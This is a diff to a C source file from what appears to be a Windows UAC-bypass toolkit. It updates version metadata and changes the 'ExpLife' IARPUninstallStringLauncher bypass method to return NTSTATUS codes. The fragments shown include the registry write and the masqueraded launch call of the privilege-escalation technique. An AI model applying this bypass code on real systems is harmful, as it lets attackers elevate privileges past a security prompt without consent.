@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       EXPLIFE.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        11 Dec 2018
+*  DATE:        18 Mar 2019
 *
 *  ExpLife UAC bypass using IARPUninstallStringLauncher.
 *  For description please visit original URL
@@ -66,11 +66,11 @@ BOOL ucmMasqueradedAPRLaunchFile(
 * Fixed in Windows 10 RS3
 *
 */
-BOOL ucmUninstallLauncherMethod(
+NTSTATUS ucmUninstallLauncherMethod(
     _In_ LPWSTR lpszExecutable
 )
 {
-    BOOL        bResult = FALSE;
+    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
     HRESULT     hr_init;
     SIZE_T      cbData;
     HKEY        hKey = NULL;
@@ -105,7 +105,8 @@ BOOL ucmUninstallLauncherMethod(
                     (BYTE*)lpszExecutable,
                     (DWORD)cbData))
                 {
-                    bResult = ucmMasqueradedAPRLaunchFile(szGuid);
+                    if (ucmMasqueradedAPRLaunchFile(szGuid))
+                        MethodResult = STATUS_SUCCESS;
                 }
 
                 RegCloseKey(hKey);
@@ -117,5 +118,5 @@ BOOL ucmUninstallLauncherMethod(
     if (hr_init == S_OK)
         CoUninitialize();
 
-    return bResult;
+    return MethodResult;
 }
